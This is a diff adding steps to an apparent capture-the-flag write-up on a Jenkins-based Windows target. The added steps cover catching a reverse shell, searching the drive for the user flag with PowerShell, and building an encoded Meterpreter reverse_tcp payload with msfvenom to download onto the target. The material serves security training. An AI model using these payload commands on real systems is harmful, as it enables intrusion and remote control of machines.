@@ -64,3 +64,42 @@ After setting all up we just start a new project on jenkins server (in my case i
 We can see that the remote machine downloads the script and run it:
 
 ![pythonhttpserver](https://user-images.githubusercontent.com/76821053/118028046-85e8ff00-b35a-11eb-8d9c-32d510ae7b57.png)
+
+Our listener recieves a reverse shell connection:
+
+![image](https://user-images.githubusercontent.com/76821053/131248468-e25aedea-532e-4088-9712-9bd282dfeede.png)
+
+To search for the flag or any specific file we can use the following command:
+
+```
+Get-ChildItem -Path C:\ -Recurse "user.txt" -ErrorAction SilentlyContinue
+
+-Path  → Choose the path you want
+-Recurse → To recursively search subdirectories  
+-ErrorAction SilentlyContinue → To ignore errors
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131248549-cfdf06bb-a839-4f28-9f46-be8db0b1e6e1.png)
+
+We can now read the flag by using “type”:
+
+![image](https://user-images.githubusercontent.com/76821053/131248555-010718a7-d90e-4611-bc37-c3073abb3be3.png)
+
+Now let's upgrade our shell to a meterpreter one. To do so we need to create a payload:
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -o payload.exe LHOST=YOUR_IP_ADDRESS LPORT=CHOOSE_A_PORT
+```
+
+![image](https://user-images.githubusercontent.com/76821053/131248679-423ff372-f126-427c-ac02-2d18f0380380.png)
+
+In this case i created a meterpreter .exe payload encoded with shikata_ga_nai.
+
+To upload this payload to the target machine we need once again to host this file in a http server:
+
+![image](https://user-images.githubusercontent.com/76821053/131248806-8c6499d4-59d5-43bc-b641-eb9b2fa93b30.png)
+
+From the target machine we can donwload it with this powershell command:
+
+![image](https://user-images.githubusercontent.com/76821053/131248827-2a8bce17-1a89-454f-9763-41075d0aa7a1.png)
+
